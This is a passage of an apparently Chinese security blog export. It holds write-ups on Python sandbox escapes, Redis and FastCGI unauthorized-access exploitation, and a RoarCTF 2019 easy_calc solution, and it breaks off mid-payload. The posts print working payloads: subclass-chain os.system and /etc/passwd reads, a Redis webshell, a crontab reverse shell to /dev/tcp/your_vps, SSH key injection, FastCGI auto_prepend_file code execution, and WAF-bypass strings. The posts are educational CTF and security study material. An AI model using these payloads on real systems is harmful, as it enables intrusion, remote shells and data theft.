<h5 id="python3中的payload"><a href="#python3中的payload" class="headerlink" title="python3中的payload"></a>python3中的payload</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">-4</span>].__init__.__globals__[<span class="string">'system'</span>](<span class="string">'ls'</span>)</span><br><span class="line"></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">93</span>].__init__.__globals__[<span class="string">"sys"</span>].modules[<span class="string">"os"</span>].system(<span class="string">"ls"</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">104</span>].__init__.__globals__[<span class="string">"sys"</span>].modules[<span class="string">"os"</span>].system(<span class="string">"ls"</span>)</span><br><span class="line"></span><br><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">127</span>].__init__.__globals__[<span class="string">'system'</span>](<span class="string">'ls'</span>)</span><br></pre></td></tr></table></figure>

<h4 id="逃逸思路总结"><a href="#逃逸思路总结" class="headerlink" title="逃逸思路总结"></a>逃逸思路总结</h4><p>在遇到一个如下的<code>python</code>沙箱环境下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line">banned = [</span><br><span class="line">    <span class="string">"import"</span>,</span><br><span class="line">    <span class="string">"exec"</span>,</span><br><span class="line">    <span class="string">"eval"</span>,</span><br><span class="line">    <span class="string">"pickle"</span>,</span><br><span class="line">    <span class="string">"os"</span>,</span><br><span class="line">    <span class="string">"subprocess"</span>,</span><br><span class="line">    <span class="string">"kevin sucks"</span>,</span><br><span class="line">    <span class="string">"input"</span>,</span><br><span class="line">    <span class="string">"banned"</span>,</span><br><span class="line">    <span class="string">"cry sum more"</span>,</span><br><span class="line">    <span class="string">"sys"</span></span><br><span class="line">]</span><br><span class="line">targets = __builtins__.__dict__.keys()</span><br><span class="line">targets.remove(<span class="string">'raw_input'</span>)</span><br><span class="line">targets.remove(<span class="string">'print'</span>)</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> targets:</span><br><span class="line">    <span class="keyword">del</span> __builtins__.__dict__[x]</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    print(<span class="string">"&gt;&gt;&gt;"</span>, end=<span class="string">' '</span>)</span><br><span class="line">    data = raw_input()</span><br><span class="line">    <span class="keyword">for</span> no <span class="keyword">in</span> banned:</span><br><span class="line">        <span class="keyword">if</span> no.lower() <span class="keyword">in</span> data.lower():</span><br><span class="line">            print(<span class="string">"No bueno"</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>: <span class="comment"># this means nobreak</span></span><br><span class="line">        <span class="keyword">exec</span> data</span><br></pre></td></tr></table></figure>

<p>大概逻辑就是把内联函数中除了<code>raw_input</code>，<code>print</code>，把其他的全部过滤掉了，所以想到可以<code>reload</code>，但是这里是删除了所有，所以<code>reload</code>也被删掉了，所以想到可以<code>import imp</code>.但是<code>import</code>又被ban掉了，所以这里只能通过引入其他类的危险函数去打穿沙箱了。</p>
<ul>
<li>首先通过<code>().__class__.__bases__[0].__subclasses__()</code>查看一下所有子类，如果有<code>file</code>对象的话可以读写文件通过下面的<code>payload</code></li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#读文件</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'/etc/passwd'</span>).read()</span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'file'</span>](<span class="string">'/etc/passwd'</span>).read() </span><br><span class="line"><span class="comment">#写文件</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'/var/www/html/flag'</span>, <span class="string">'w'</span>).write(<span class="string">'flag&#123;sandbox_is_so_cool&#125;'</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>如果子类中有<code>&lt;class &#39;warnings.catch_warnings&#39;&gt;</code>，可以通过<code>().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__</code>,发现两个很有用的方法属性，就是<code>__builtins__</code>和<code>linecache</code></li>
</ul>
<p><strong><code>__builtins__</code>的操作有</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">'eval'</span>](<span class="string">'__import__("os").system("ls")'</span>)</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'__import__'</span>](<span class="string">'os'</span>).system(<span class="string">'ls'</span>)</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>]()._module.__builtins__[<span class="string">'__import__'</span>](<span class="string">"os"</span>).system(<span class="string">"ls"</span>)</span><br></pre></td></tr></table></figure>

<p><strong>linecache是一个很神奇的模块</strong></p>
<p>通过<code>dir()</code>可以发现</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[<span class="string">'__all__'</span>, <span class="string">'__builtins__'</span>, <span class="string">'__doc__'</span>, <span class="string">'__file__'</span>, <span class="string">'__name__'</span>, <span class="string">'__package__'</span>, <span class="string">'cache'</span>, <span class="string">'checkcache'</span>, <span class="string">'clearcache'</span>, <span class="string">'getline'</span>, <span class="string">'getlines'</span>, <span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'updatecache'</span>]</span><br></pre></td></tr></table></figure>

<p>这里是存在os模块的，所以我们可以通过os进行系统命令</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals[<span class="string">'linecache'</span>].os.system(<span class="string">'ls'</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>其他类中的命令执行</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">71</span>].__init__.__globals__[<span class="string">'os'</span>]</span><br><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">76</span>].__init__.__globals__[<span class="string">'os'</span>]</span><br></pre></td></tr></table></figure>

<p>所以说，最引入<code>object</code>进行沙箱逃逸，首先要通过<code>subclasses</code>找到当前的子类，有<code>file</code>对象的话就用<code>file</code>写，读文件;有<code>&lt;class &#39;warnings.catch_warnings&#39;&gt;</code>的话用<code>__globals__</code>去找那两个关键属性方法,<code>linecache</code>和<code>__builtins__</code>，通过<code>linecache</code>进行引入os模块命令执行，通过<code>__builtins__</code>引入<code>eval</code>，或者<code>__import__</code>，进行命令执行,如果都不行的话可以考虑</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">71</span>].__init__.__globals__[<span class="string">'os'</span>]</span><br><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">76</span>].__init__.__globals__[<span class="string">'os'</span>]</span><br></pre></td></tr></table></figure>

<h4 id="绕过过滤小tips"><a href="#绕过过滤小tips" class="headerlink" title="绕过过滤小tips"></a>绕过过滤小tips</h4><ul>
<li>. 可替换为<code>getattr()</code></li>
<li>_ 可替换为<code>dir[0][0][0]</code></li>
</ul>
<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="https://www.smi1e.top/python-沙箱逃逸/" target="_blank" rel="noopener">https://www.smi1e.top/python-%e6%b2%99%e7%ae%b1%e9%80%83%e9%80%b8/</a></p>
<p><a href="http://yulige.top/?p=502" target="_blank" rel="noopener">http://yulige.top/?p=502</a></p>
<p><a href="http://shaobaobaoer.cn/archives/656/python-sandbox-escape" target="_blank" rel="noopener">http://shaobaobaoer.cn/archives/656/python-sandbox-escape</a></p>
<p><a href="https://hatboy.github.io/2018/04/19/Python沙箱逃逸总结/" target="_blank" rel="noopener">https://hatboy.github.io/2018/04/19/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E6%80%BB%E7%BB%93/</a></p>
<p><a href="https://xz.aliyun.com/t/2308" target="_blank" rel="noopener">https://xz.aliyun.com/t/2308</a></p>
]]></content>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis&amp;Fastcgi未授权访问漏洞</title>
    <url>/2019/06/30/Redis-Fastcgi%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id="Redis未授权访问"><a href="#Redis未授权访问" class="headerlink" title="Redis未授权访问"></a>Redis未授权访问</h2><h3 id="redis介绍"><a href="#redis介绍" class="headerlink" title="redis介绍"></a>redis介绍</h3><p>Redis是一个使用<code>ANSI C</code>编写的开源、支持网络、基于内存、可选持久性的键值对存储数据库。Redis未授权访问的原因产生于未能正确的配置<code>/etc/redis.conf</code>的内容。</p>
<p>如<code>bind</code>开启的是<code>0.0.0.0</code>或者没有开启保护模式等等。造成危险操作未授权访问。并且未授权访问可以造成很多危害。</p>
<h3 id="redis未授权访问常见命令操作"><a href="#redis未授权访问常见命令操作" class="headerlink" title="redis未授权访问常见命令操作"></a>redis未授权访问常见命令操作</h3><ul>
<li>查看所有键</li>
</ul>
<p><code>keys *</code></p>
<ul>
<li>查看版本等敏感信息</li>
</ul>
<p><code>info</code></p>
<ul>
<li>设置键值与查看键值</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set xxx   xxxx</span><br><span class="line"></span><br><span class="line">get xxx</span><br></pre></td></tr></table></figure>

<ul>
<li>设置配置信息</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">config set dbfilename xxx</span><br><span class="line"></span><br><span class="line">config get dbfilename</span><br></pre></td></tr></table></figure>

<ul>
<li>删除数据库的所有键值对</li>
</ul>
<p><code>flushall</code></p>
<h3 id="redis写webshell"><a href="#redis写webshell" class="headerlink" title="redis写webshell"></a>redis写webshell</h3><p>在较低权限下可利用此方法写webshell，payload如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">config set dir &#x2F;var&#x2F;www&#x2F;html</span><br><span class="line"></span><br><span class="line">config set dbfilename webshell.php</span><br><span class="line"></span><br><span class="line">set x &quot;&lt;?php phpinfo();?&gt;&quot;</span><br><span class="line"></span><br><span class="line">save</span><br></pre></td></tr></table></figure>

<p>即可在公网下生成文件</p>
<p><a href="https://imgchr.com/i/ZMRn29" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/06/28/ZMRn29.md.png" alt="ZMRn29.md.png"></a></p>
<p>在实战中产生的问题，当键值对过多，无法直接<code>save</code>到我们的<code>webshell.php</code>中，所以可以通过<code>flushall</code>来清楚所有的键值对，再来写入我们的<code>shell</code>，不过这个方法影响太大了…不太建议使用。</p>
<h3 id="redis利用定时任务-corntab-反弹shell"><a href="#redis利用定时任务-corntab-反弹shell" class="headerlink" title="redis利用定时任务(corntab)反弹shell"></a>redis利用定时任务(corntab)反弹shell</h3><p>限定条件：<strong>在redis以root权限运行时可以写crontab执行命令反弹shell</strong></p>
<p>crontab介绍：linux的定时任务主要使用<code>crontab</code>文件中加入定时任务执行，目录为<code>/var/spool/cron</code>下,文件名对应着执行该定时任务的用户名。</p>
<p>操作payload为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set aaa &quot;\n\n* * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;your_vps&#x2F;your_port 0&gt;&amp;1\n\n&quot;</span><br><span class="line"></span><br><span class="line">config set dir &#x2F;var&#x2F;spool&#x2F;cron</span><br><span class="line"></span><br><span class="line">config set dbfilename root</span><br><span class="line"></span><br><span class="line">save</span><br></pre></td></tr></table></figure>

<p><code>\n\n</code>的作用为和其他内容进行分离，通过在cron目录下写计划任务，即可反弹shell</p>
<p><a href="https://imgchr.com/i/ZMf7v9" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/06/28/ZMf7v9.md.png" alt="ZMf7v9.md.png"></a></p>
<p>注意点：crontab无法在<code>debian,ubuntu</code>上反弹，因为这两个系统对计划任务的格式要求很严，必须执行</p>
<p><code>crontab -u root /var/spool/cron/crontabs/root</code></p>
<h3 id="redis写入SSH公钥进行直连"><a href="#redis写入SSH公钥进行直连" class="headerlink" title="redis写入SSH公钥进行直连"></a>redis写入SSH公钥进行直连</h3><p>首先生成公钥</p>
<p><a href="https://imgchr.com/i/ZMhm8g" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/06/28/ZMhm8g.md.png" alt="ZMhm8g.md.png"></a></p>
<p>将公钥利用如下<code>payload</code>放到靶机的<code>~/.ssh</code>中</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">config set dir &#x2F;root&#x2F;.ssh</span><br><span class="line"></span><br><span class="line">config set dbfilename  authorized_keys</span><br><span class="line"></span><br><span class="line">set x &quot;\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCZS8alMMMzm8OXIcuTpbMf6wBfIrFzbInhZeteZh2PrHXiiG0UHlKHcZ&#x2F;l&#x2F;INRfNC3hFWVnc4zD1ch              96FJcszytymwK&#x2F;+pNKH&#x2F;qpw0oUPF86ihXSoLDDGuXApBW9fNww8MYvHxL&#x2F;UAOdb+zZ4KgVcAuPsEFiyOa9M2BgnR5Qie9ImRVux+KmWI+Y2S2IvnTkcw   z3b+dJUmfhHdf7Q+mz8xszhYNE2DAgUNxWngUd+61jdZssfn0eufY8sXOnARdVlvUb69Aeq&#x2F;m9LxqCuwNVJajCqs2pdUqZxinyeqGUceZQbUNVJp1JxcduD3pxgSmoXGRDLwDbMOg3XNSxSrKsqnroot@VM_0_6_centos\n\n\n&quot;</span><br><span class="line"></span><br><span class="line">save</span><br></pre></td></tr></table></figure>

<p>在本机中利用私钥连接</p>
<p><code>[root@VM_0_6_centos .ssh]# ssh -i id_rsa root@your_vps</code></p>
<p><strong>防御手段</strong></p>
<ul>
<li><code>bind</code>设置为<code>127.0.0.1</code></li>
<li><code>redis.conf</code>中开启保护模式</li>
</ul>
<h2 id="Fastcgi未授权访问"><a href="#Fastcgi未授权访问" class="headerlink" title="Fastcgi未授权访问"></a>Fastcgi未授权访问</h2><p>之前有跟着p牛的文章过了一遍<code>Fastcgi</code>，下面再学习理解一遍。</p>
<h3 id="Fastcgi介绍"><a href="#Fastcgi介绍" class="headerlink" title="Fastcgi介绍"></a>Fastcgi介绍</h3><p><code>Fastcgi</code>与<code>http</code>协议一样都是一个通信协议。<strong><code>http</code>协议的作用为在浏览器与服务器之间进行数据交换。过程为：浏览器将http头与http体组合为数据包，以tcp形式发送给服务器中间件，服务器中间件进行解析，在服务器上拿到对应的数据，并以http形式打包发回给浏览器。</strong></p>
<p><strong>Fastcgi协议</strong></p>
<p>如果我们请求的链接为一个静态页面，那么就会按照http协议这个流程发送给服务器中间件，服务器中间件去解码并且在服务器上拿到对应的资源然后按照tcp形式打包返回给浏览器</p>
<p><img src="http://img.php.cn/upload/article/000/153/291/6c9bcffa8cfbeeb8c79eaf3705720116-0.png" alt="img"></p>
<p>如果我们请求的是动态页面，如<code>index.php</code>，则过程图如下：</p>
<p><img src="http://img.php.cn/upload/article/000/153/291/6c9bcffa8cfbeeb8c79eaf3705720116-1.png" alt="img"></p>
<p>浏览器首先发送请求给服务器中间件<code>Nginx</code>，<code>Nginx</code>将用户请求以<code>Fastcgi</code>的规则打包好通过<code>tcp</code>传给<code>PHP-FPM</code>，<code>PHP-FPM</code>按照<code>Fastcgi</code>协议将<code>tcp</code>流解析为真正的数据，即先解析<code>php.ini</code>文件，初始化执行环境，处理请求，并将最终数据以返回给<code>web-Server</code>。</p>
<h3 id="PHP-FPM介绍"><a href="#PHP-FPM介绍" class="headerlink" title="PHP-FPM介绍"></a><strong>PHP-FPM介绍</strong></h3><p><code>PHP-FPM</code>其实在上述的协议图中已经透露出了他的作用，<code>PHP-FPM(PHP FastCGI Process Manager)</code>意：<code>PHP FastCGI</code>进程管理器，用于管理<code>PHP</code>进程池的软件，用于接受web服务器的请求。在上述流程中，<code>php-fpm</code>通过解析<code>php.ini</code>,初始化执行环境，才会将<code>tcp</code>流按照<code>fastcgi</code>形式解析为真正的数据。</p>
<p>当用户访问<a href="http://127.0.0.1/index.php?a=&amp;b=2,如对应的web目录为`/var/www/html`,`nginx`会将请求变为如下键值对" target="_blank" rel="noopener">http://127.0.0.1/index.php?a=&amp;b=2,如对应的web目录为`/var/www/html`,`nginx`会将请求变为如下键值对</a>:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &#39;GATEWAY_INTERFACE&#39;: &#39;FastCGI&#x2F;1.0&#39;,</span><br><span class="line">    &#39;REQUEST_METHOD&#39;: &#39;GET&#39;,</span><br><span class="line">    &#39;SCRIPT_FILENAME&#39;: &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&#39;,</span><br><span class="line">    &#39;SCRIPT_NAME&#39;: &#39;&#x2F;index.php&#39;,</span><br><span class="line">    &#39;QUERY_STRING&#39;: &#39;?a&#x3D;1&amp;b&#x3D;2&#39;,</span><br><span class="line">    &#39;REQUEST_URI&#39;: &#39;&#x2F;index.php?a&#x3D;1&amp;b&#x3D;2&#39;,</span><br><span class="line">    &#39;DOCUMENT_ROOT&#39;: &#39;&#x2F;var&#x2F;www&#x2F;html&#39;,</span><br><span class="line">    &#39;SERVER_SOFTWARE&#39;: &#39;php&#x2F;fcgiclient&#39;,</span><br><span class="line">    &#39;REMOTE_ADDR&#39;: &#39;127.0.0.1&#39;,</span><br><span class="line">    &#39;REMOTE_PORT&#39;: &#39;12345&#39;,</span><br><span class="line">    &#39;SERVER_ADDR&#39;: &#39;127.0.0.1&#39;,</span><br><span class="line">    &#39;SERVER_PORT&#39;: &#39;80&#39;,</span><br><span class="line">    &#39;SERVER_NAME&#39;: &quot;localhost&quot;,</span><br><span class="line">    &#39;SERVER_PROTOCOL&#39;: &#39;HTTP&#x2F;1.1&#39;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这些键值对其实就是对应的环境变量，<code>php-fpm</code>通过这些去初始化执行环境返回请求。大致过程为<code>PHP-FPM</code>通过<code>fastcgi</code>解析中间件传过来的<code>tcp</code>数据,按照这些键值对的环境变量去初始化执行环境，并执行<code>SCRIPT_NAME</code>所指向的文件，在本例子中执行的是<code>/var/www/html/index.php</code>。</p>
<h3 id="安全性思考"><a href="#安全性思考" class="headerlink" title="安全性思考"></a>安全性思考</h3><p>如果我们能控制<code>SCRIPT_NAME</code>所对应的值，那么其实就是可以执行我们想要的<code>php</code>文件..但是这个似乎不能实现，不过<code>nginx</code>解析漏洞则<code>&quot;变相&quot;</code>实现了这一点。</p>
<p>如果用户访问<a href="http://127.0.0.1/favicon.ico/.php，nginx则对应发送如下键值对给php-fpm" target="_blank" rel="noopener">http://127.0.0.1/favicon.ico/.php，nginx则对应发送如下键值对给php-fpm</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    &#39;SCRIPT_FILENAME&#39;: &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;favicon.ico&#x2F;.php&#39;,</span><br><span class="line">    &#39;SCRIPT_NAME&#39;: &#39;&#x2F;favicon.ico&#x2F;.php&#39;,</span><br><span class="line">    &#39;REQUEST_URI&#39;: &#39;&#x2F;favicon.ico&#x2F;.php&#39;,</span><br><span class="line">    &#39;DOCUMENT_ROOT&#39;: &#39;&#x2F;var&#x2F;www&#x2F;html&#39;,</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于<code>fix_pathinfo</code>选项在试别到<code>/var/www/html/favicon.ico/.php</code>时，发现这个文件时不存在在的，则会去掉<code>/.php</code>，将<code>favicon.ico</code>当作<code>php</code>文件执行，为了防范此漏洞，<code>fpm</code>中默认增加了一个配置选项<code>security.limit_extensions</code>，内容如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">; Limits the extensions of the main script FPM will allow to parse. This can</span><br><span class="line">; prevent configuration mistakes on the web server side. You should only limit</span><br><span class="line">; FPM to .php extensions to prevent malicious users to use other extensions to</span><br><span class="line">; exectute php code.</span><br><span class="line">; Note: set an empty value to allow all extensions.</span><br><span class="line">; Default Value: .php</span><br><span class="line">;security.limit_extensions &#x3D; .php .php3 .php4 .php5 .php7</span><br></pre></td></tr></table></figure>

<p>这样只会解析特定后缀的文件，避免产生上述的漏洞情况。</p>
<h3 id="攻击点-未授权访问漏洞的产生"><a href="#攻击点-未授权访问漏洞的产生" class="headerlink" title="攻击点(未授权访问漏洞的产生)"></a>攻击点(未授权访问漏洞的产生)</h3><p>在<code>php.ini</code>中有两个配置选项,<code>auto_prepend_file</code>与<code>auto_append_file</code>,</p>
<p><code>auto_prepend_file</code>作用为，在执行目标文件之前，先包含<code>auto_prepend_file</code>指定的文件。<code>auto_append_file</code>作用为，在执行目标文件之后，再包含<code>auto_prepend_file</code>中指定的文件。所以<code>auto_prepend_file</code>去配合<code>php://input</code>则会产生奇效，去执行我们body中的任意php代码。</p>
<p><strong>设置<code>auto_prepend_file</code>的方法</strong></p>
<p><code>PHP_VALUE</code>可以设置模式为<code>PHP_INI_USER</code>和<code>PHP_INI_ALL</code>的选项，<code>PHP_ADMIN_VALUE</code>可以设置所有选项。</p>
<p><strong>找到一个php文件的绝对路径</strong></p>
<p>上述的<code>security.limit_extensions</code>选项限制了我们只能执行特定后缀的文件，所以我们必须找到一个php文件的绝对路径，才能触发此漏洞，可以通过默认源安装文件进行触发如<code>/usr/local/lib/php/PEAR.php</code>,再debian7上存在的文件是<code>/var/cache/dictionaries-common/sqspell.php</code>，所以通过传入如下键值对就可以任意php代码执行。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &#39;GATEWAY_INTERFACE&#39;: &#39;FastCGI&#x2F;1.0&#39;,</span><br><span class="line">    &#39;REQUEST_METHOD&#39;: &#39;GET&#39;,</span><br><span class="line">    &#39;SCRIPT_FILENAME&#39;: &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&#39;,</span><br><span class="line">    &#39;SCRIPT_NAME&#39;: &#39;&#x2F;index.php&#39;,</span><br><span class="line">    &#39;QUERY_STRING&#39;: &#39;?a&#x3D;1&amp;b&#x3D;2&#39;,</span><br><span class="line">    &#39;REQUEST_URI&#39;: &#39;&#x2F;index.php?a&#x3D;1&amp;b&#x3D;2&#39;,</span><br><span class="line">    &#39;DOCUMENT_ROOT&#39;: &#39;&#x2F;var&#x2F;www&#x2F;html&#39;,</span><br><span class="line">    &#39;SERVER_SOFTWARE&#39;: &#39;php&#x2F;fcgiclient&#39;,</span><br><span class="line">    &#39;REMOTE_ADDR&#39;: &#39;127.0.0.1&#39;,</span><br><span class="line">    &#39;REMOTE_PORT&#39;: &#39;12345&#39;,</span><br><span class="line">    &#39;SERVER_ADDR&#39;: &#39;127.0.0.1&#39;,</span><br><span class="line">    &#39;SERVER_PORT&#39;: &#39;80&#39;,</span><br><span class="line">    &#39;SERVER_NAME&#39;: &quot;localhost&quot;,</span><br><span class="line">    &#39;SERVER_PROTOCOL&#39;: &#39;HTTP&#x2F;1.1&#39;</span><br><span class="line">    &#39;PHP_VALUE&#39;: &#39;auto_prepend_file &#x3D; php:&#x2F;&#x2F;input&#39;,</span><br><span class="line">    &#39;PHP_ADMIN_VALUE&#39;: &#39;allow_url_include &#x3D; On&#39;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="利用限制"><a href="#利用限制" class="headerlink" title="利用限制"></a>利用限制</h3><ul>
<li>网站对外开放9000端口。</li>
<li>有一个php文件的绝对路径。</li>
</ul>
<p>其实如果网站没有开放<code>9000</code>端口的话，我们也是可以通过<code>ssrf</code>配合<code>gopher</code>去攻击内网的<code>Fastcgi</code>应用的(详见下期博客hh</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://p0sec.net/index.php/archives/69/" target="_blank" rel="noopener">https://p0sec.net/index.php/archives/69/</a></p>
<p><a href="https://xz.aliyun.com/t/4051#toc-7" target="_blank" rel="noopener">https://xz.aliyun.com/t/4051#toc-7</a></p>
<p><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a></p>
<p><a href="http://www.php.cn/php-weizijiaocheng-392861.html" target="_blank" rel="noopener">http://www.php.cn/php-weizijiaocheng-392861.html</a></p>
]]></content>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Roarctf2019</title>
    <url>/2019/10/20/Roarctf2019/</url>
    <content><![CDATA[<h3 id="easy-calc"><a href="#easy-calc" class="headerlink" title="easy_calc"></a>easy_calc</h3><p>这题后面的代码bypass挺简单的，也就是这个</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $str = $_GET[<span class="string">'num'</span>];</span><br><span class="line">        $blacklist = [<span class="string">' '</span>, <span class="string">'\t'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>,<span class="string">'\''</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>,<span class="string">'\$'</span>,<span class="string">'\\'</span>,<span class="string">'\^'</span>];</span><br><span class="line">        <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/m'</span>, $str)) &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">"what are you want to do?"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">'echo '</span>.$str.<span class="string">';'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>主要是jQuery先是传给了waf，waf遇到字符就403</p>
<p><img src="https://s2.ax1x.com/2019/10/14/KpdvNR.png" alt="KpdvNR.png"></p>
<p>这里可以看到是采用?num传给waf的，所以?%20num就可以Bypass掉waf了，直接传给calc.php正常执行了。</p>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%20num&#x3D;1;var_dump(readfile(hex2bin(base_convert(52115961636711,10,16))))</span><br><span class="line">&#x2F;&#x2F;更简单的一点的payload</span><br><span class="line">%20num&#x3D;1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</span><br></pre></td></tr></table></figure>

<p>不过这道题我重点想说了还是E99这位师傅payload，太硬核了，膜。</p>
<p>通过1/0得到INF以及0/0拿到NAN去构造payload,并且通过位运算拿到新的字符</p>
<p>Fuzz的脚本</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$char = <span class="string">'1234567890-INFAH@+*%$()"!%meogiakcfhvwbnq_'</span>;</span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; strlen($char); $i++)&#123;</span><br><span class="line">    <span class="keyword">for</span>($j = <span class="number">0</span>; $j &lt; strlen($char); $j++)&#123;</span><br><span class="line">        <span class="keyword">echo</span>($char[$i] .<span class="string">'&amp;'</span> .$char[$j] . <span class="string">' '</span>. ($char[$i] &amp; $char[$j]));</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">"&lt;br&gt;"</span>);</span><br><span class="line">        <span class="keyword">echo</span>($char[$i] .<span class="string">'|'</span> .$char[$j] . <span class="string">' '</span>. ($char[$i] | $char[$j]));</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">"&lt;br&gt;"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>按这个意思，构造了一个phpinfo()来学习了一波</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> (((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;|((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">2</span>&#125;)&amp;(((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;|(<span class="number">0</span>).(<span class="number">0</span>)&#123;<span class="number">1</span>&#125;)).((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>)&#123;<span class="number">0</span>&#125;&amp;((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;).((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;|((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">2</span>&#125;)&amp;(((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;|(<span class="number">0</span>).(<span class="number">0</span>)&#123;<span class="number">1</span>&#125;)).(((<span 